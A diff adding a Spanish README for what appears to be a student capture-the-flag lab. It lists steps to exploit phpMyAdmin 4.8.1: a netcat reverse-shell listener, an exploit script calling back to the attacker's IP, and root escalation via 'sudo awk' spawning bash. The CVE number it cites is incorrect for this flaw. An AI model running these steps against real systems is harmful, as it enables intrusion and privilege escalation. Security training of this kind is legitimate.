@@ -1,0 +1,20 @@
+SSI16: Iker Goñi Lara y Eduardo Ezponda Igea
+
+CVE-2024-30078: Remote code execution
+PhpMyAdmin 4.8.1
+
+
+https://www.exploit-db.com/download/50457
+50457.py: Archivo en el que hemos basado nuestro propio script
+
+Pasos a ejecutar:
+1. nc -lvnp 5500 en la máquina atacante (está el puerto 5500 configurado en single_command.py)
+2. python single_command.py IP_MAQUINA_VULNERABLE 80 /phpMyAdmin-4.8.1-all-languages LOCAL_IP en otra terminal de la máquina atacante
+
+Una vez se obtiene la shell al hacer listen en el puerto 5500, ya solo nos faltaría ejecutar los comandos correspondientes:
+
+1. Flag de user:
+	- cat ../../../../home/mazapan/user.txt
+2. Flag de root:
+	- sudo awk 'BEGIN {system("/bin/bash")}'
+	- cat ../../../../root/root.txt
